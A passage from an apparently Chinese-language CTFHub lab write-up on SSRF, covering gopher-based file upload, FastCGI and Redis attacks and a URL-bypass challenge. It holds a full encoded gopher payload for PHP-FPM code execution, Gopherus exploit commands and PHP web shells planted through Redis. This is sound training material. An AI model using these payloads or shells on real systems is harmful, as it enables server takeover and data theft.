&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&quot;file&quot;]) &amp;&amp; $_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 0)&#123;</span><br><span class="line">    echo getenv(&quot;CTFHUB&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Upload Webshell</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602192358956.png" alt="image-20240602192358956"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_FILES[&quot;file&quot;]) &amp;&amp; $_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 0)&#123;</span><br><span class="line">    echo getenv(&quot;CTFHUB&quot;);</span><br><span class="line">    exit;</span><br></pre></td></tr></table></figure>

<p>意思是:</p>
<ul>
<li><strong>需要在本地上传一个文件，且文件不能为空</strong></li>
</ul>
<blockquote>
<p>而且这里缺了一个提交按钮，我们直接给他加上</p>
</blockquote>
<h4 id="编写一个提交按钮"><a href="#编写一个提交按钮" class="headerlink" title="编写一个提交按钮"></a>编写一个提交按钮</h4><p>发现没有提交按钮，没关系，F12直接在网页编写一个按钮</p>
<ul>
<li>F12打开控制台，在元素处直接修改HMTL</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602193253393.png" alt="image-20240602193253393"></p>
<ul>
<li>手动加上一个按钮</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602193349440.png" alt="image-20240602193349440"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602193351592.png" alt="image-20240602193351592"></p>
<ul>
<li>前端网页就会出现按钮</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602193422566.png" alt="image-20240602193422566"></p>
<ul>
<li>现在再提交</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602193437049.png" alt="image-20240602193437049"></p>
<p>从刚刚flag.php的源码中我们可以知道</p>
<ul>
<li>要从<strong>127.0.0.1</strong>随便上传一个文件，就能拿到flag</li>
<li>从别的地址上传还是会弹出像<strong>just view</strong> 的页面，所以不关文件内容的事情，我们要让服务端自己发请求，这就达到<strong>伪造本机地址</strong>的目的</li>
</ul>
<p>抓包改host为127.0.0.1还是不行，还是走gopher协议吧</p>
<h4 id="抓POST的文件上传包"><a href="#抓POST的文件上传包" class="headerlink" title="抓POST的文件上传包"></a>抓POST的文件上传包</h4><ul>
<li>用<strong>按钮</strong>提交上传，抓包</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602201247402.png" alt="image-20240602201247402"></p>
<ul>
<li>把多余部分删掉（就是红字部分）</li>
<li>将包中的<code>host</code>也改成<code>127.0.0.1</code></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602222744969.png" alt="image-20240602222744969"></p>
<ul>
<li>关键点在于这个name&#x3D;<code>file</code>，因为题目不要求上传的文件内容，但是要求上传的文件名是file</li>
</ul>
<h4 id="用gopher伪协议上传POST包"><a href="#用gopher伪协议上传POST包" class="headerlink" title="用gopher伪协议上传POST包"></a>用gopher伪协议上传POST包</h4><ul>
<li>然后在<strong>最初的界面抓包</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602223030839.png" alt="image-20240602223030839"></p>
<ul>
<li><p>复制刚刚的数据包，进行两次编码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602223002641.png" alt="image-20240602223002641"></p>
</li>
<li><p>因为两次编码太长，可以第二次用“只对特殊字符编码</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602222944604.png" alt="image-20240602222944604"></p>
<ul>
<li>拿到flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240602223018347.png" alt="image-20240602223018347"></p>
<h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604191534603.png" alt="image-20240604191534603"></p>
<ul>
<li><p>题目附件<a target="_blank" rel="noopener" href="https://blog.csdn.net/mysteryflower/article/details/94386461">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写_flower未授权访问-CSDN博客</a></p>
</li>
<li><p>题解博客[CTFHUB–SSRF（中）–FastCGI协议\Redis协议 以及gopherus工具攻击_ctfhub redis协议-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_75120258/article/details/137149548?ops_request_misc=%7B%22request_id%22:%22171741586616800222859728%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=171741586616800222859728&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-137149548-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=ctfhub">https://blog.csdn.net/qq_75120258/article/details/137149548?ops_request_misc=%7B%22request%5Fid%22%3A%22171741586616800222859728%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=171741586616800222859728&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-137149548-null-null.142^v100^pc_search_result_base6&amp;utm_term=ctfhub</a> ssrf fastcgi协议&amp;spm&#x3D;1018.2226.3001.4187)</p>
</li>
</ul>
<h4 id="Fastcgi协议分析"><a href="#Fastcgi协议分析" class="headerlink" title="Fastcgi协议分析"></a>Fastcgi协议分析</h4><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>使用<strong>gopherus</strong>工具</p>
<p>（工具下载地址）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/tarunkant/Gopherus.git</span><br></pre></td></tr></table></figure>

<ul>
<li>从gopherus压缩文件打开终端</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604191940076.png" alt="image-20240604191940076"></p>
<ul>
<li>打开<strong>fastcgi协议</strong></li>
<li>输入命令：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 2 gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604192120307.png" alt="image-20240604192120307"></p>
<ul>
<li>再打开文件<strong>index.php</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/index.php</span><br></pre></td></tr></table></figure>

<ul>
<li>同时查看目录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604192400419.png" alt="image-20240604192400419"></p>
<ul>
<li><p>将得到的结果进行一次<strong>URL编码</strong></p>
</li>
<li><p>后放入原网页的url处</p>
</li>
<li><p>用<strong>burp suite</strong>进行特殊字符部分编码</p>
<p>（试过全部编码能得到一样的结果，只是会比较长）</p>
</li>
<li><p>建议用burp suite编码比较好（不知道为什么有时候用其他工具进行URL编码就得不到结果） （其实也可以）</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604192549606.png" alt="image-20240604192549606"></p>
<ul>
<li><p>在原网页打开</p>
</li>
<li><p>得到flag文件的文件名</p>
</li>
</ul>
<p><code>flag_5a728dabfd4d051270bb89b051c70db6</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604192719096.png" alt="image-20240604192719096"></p>
<ul>
<li><p>然后在Kali终端再使用一次fastcgi协议</p>
</li>
<li><p>这次要读取flag文件</p>
</li>
<li><p>先打开index.php</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/index.php</span><br></pre></td></tr></table></figure>

<ul>
<li>读取flag文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag_5a728dabfd4d051270bb89b051c70db6</span><br></pre></td></tr></table></figure>

<p>或者可以用：（如果说有过滤的话）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat /flag_5a728dabfd4d051270bb89b051c70db6&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604193341641.png" alt="image-20240604193341641"></p>
<ul>
<li>将这次得到的结果进行一次URL编码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604193438570.png" alt="image-20240604193438570"></p>
<ul>
<li>再将编码后的payload放到原网页的url后面</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_5a728dabfd4d051270bb89b051c70db6%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604193736544.png" alt="image-20240604193736544"></p>
<h3 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604202131984.png" alt="image-20240604202131984"></p>
<h4 id="Redis协议分析"><a href="#Redis协议分析" class="headerlink" title="Redis协议分析"></a>Redis协议分析</h4><p>什么是Redis协议？</p>
<blockquote>
<p><strong>Redis协议</strong>，也被称为 RESP (Redis Serialization Protocol)，它是一种简单的文本协议，用于在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&spm=1001.2101.3001.7020">客户端</a>和服务器之间操作和传输数据。可以说是最简单的一种<strong>传输协议</strong>。</p>
</blockquote>
<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><ul>
<li>首先访问环境</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604202752383.png" alt="image-20240604202752383"></p>
<ul>
<li><p>使用工具gopheus来生成payload</p>
</li>
<li><p>输入命令</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit redis</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604202932561.png" alt="image-20240604202932561"></p>
<ul>
<li>这里我们使用PHPshell 并且使用默认路径，生成代码的文件名为 shell.php</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpshell</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604203013260.png" alt="image-20240604203013260"></p>
<ul>
<li><p>直接Enter</p>
</li>
<li><p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>得到生成的pyload</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604212840276.png" alt="image-20240604212840276"></p>
<ul>
<li>将其进行一次URL编码</li>
<li>随后放入原网页的url处</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604205529964.png" alt="image-20240604205529964"></p>
<p><strong>(按理说原网页会显示504，但是这里死活不行)（后来换Google浏览器就可以了）</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604205510046.png" alt="image-20240604205510046"></p>
<ul>
<li>再访问<code>shell.php</code></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604205457095.png" alt="image-20240604205457095"></p>
<ul>
<li>成功访问！！！</li>
<li>说明<strong>shell.php</strong>文件成功上传了</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604210250009.png" alt="image-20240604210250009"></p>
<h5 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h5><ul>
<li>下面我们就可以读取</li>
<li>先尝试<code>ls</code></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604212440422.png" alt="image-20240604212440422"></p>
<p><strong>（这里测试了很久都打不开，后来发现因为上传的是POST传参，所以在url处不行（url是GET））</strong></p>
<ul>
<li><p>于是用Hackbar，进行POST传参试试</p>
</li>
<li><p>这里由于用的是<code>eval</code>，而不是system，而<code>ls</code>命令不是php代码，所以要用到system函数</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604212936161.png" alt="image-20240604212936161"></p>
<ul>
<li>把ls用system函数括起来</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604213014899.png" alt="image-20240604213014899"></p>
<ul>
<li>即可成功执行命令，拿到flag文件名</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604213108431.png" alt="image-20240604213108431"></p>
<ul>
<li>下面再读取flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604213153313.png" alt="image-20240604213153313"></p>
<ul>
<li>执行命令，成功拿到flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604213227873.png" alt="image-20240604213227873"></p>
<h5 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h5><p>那么成功上传shell.php之后我们其实可以直接连接蚁剑了</p>
<p>（失败了好几次，后来才发现是因为复制url的时候多复制了一个http:&#x2F;&#x2F;）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604213527193.png" alt="image-20240604213527193"></p>
<ul>
<li>进入蚁剑，访问</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604213635099.png" alt="image-20240604213635099"></p>
<ul>
<li>点开shell.php</li>
<li>可以看到我们刚刚上传上去的木马</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604213719906.png" alt="image-20240604213719906"></p>
<ul>
<li>找啊找，在根目录里找到flag文件</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604213825189.png" alt="image-20240604213825189"></p>
<ul>
<li>顺利拿到flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604213845718.png" alt="image-20240604213845718"></p>
<h5 id="思考-1"><a href="#思考-1" class="headerlink" title="思考"></a>思考</h5><h6 id="1-若改用GET传参"><a href="#1-若改用GET传参" class="headerlink" title="1.若改用GET传参"></a>1.若改用GET传参</h6><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604214324188.png" alt="image-20240604214324188"></p>
<ul>
<li>那么是不是就可以直接在url处<code>ls</code>？？？</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604214607609.png" alt="image-20240604214607609"></p>
<h6 id="2-不输入Shell内容"><a href="#2-不输入Shell内容" class="headerlink" title="2.不输入Shell内容"></a>2.不输入Shell内容</h6><ul>
<li>即不输入<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code>，<strong>直接Enter</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604214915599.png" alt="image-20240604214915599"></p>
<ul>
<li>发现这样得到的代码，其实本身就是GET传参</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604214753561.png" alt="image-20240604214753561"></p>
<ul>
<li>把这段代码进行一次URL编码后放到原网页url处</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604215202857.png" alt="image-20240604215202857"></p>
<ul>
<li>shell.php上传成功</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604215241268.png" alt="image-20240604215241268"></p>
<ul>
<li>经过测试，果然这样通过GET传参，就可以直接在url处<code>ls</code>！！</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604215059027.png" alt="image-20240604215059027"></p>
<p>综上，直接Enter得到的代码其实就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>的编码，默认为<strong>GET传参</strong>，且键值对的键为“<strong>cmd</strong>”</p>
<h6 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h6><ul>
<li>第一行这里我们填写<code>phpshell</code>，因为我们需要的是phpshell</li>
<li>第二行可以不填，默认根路径为<code>/var/www/html</code></li>
<li>第三行就写入我们的<code>shell代码</code></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240604220246016.png" alt="image-20240604220246016"></p>
<hr>
<p>所以说，其实用<strong>GET传参</strong>和用<strong>POST传参</strong>都可以</p>
<ul>
<li><p>若用POST传参，那么可以用Hackbar传命令，也可以直接用蚁剑连接（毕竟shell.php已经上传了）</p>
</li>
<li><p>若用GET传参，直接在url处<code>ls</code>和<code>cat</code>就好了</p>
</li>
</ul>
<p>将编码后的代码放到原网页的url处，只要能成功上传shell文件，都可以用蚁剑连接</p>
<h3 id="URLBypass"><a href="#URLBypass" class="headerlink" title="URLBypass"></a>URLBypass</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240607062041184.png" alt="image-20240607062041184"></p>
<h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><ul>
<li>利用**@**</li>
<li>构造payload</li>
</ul>
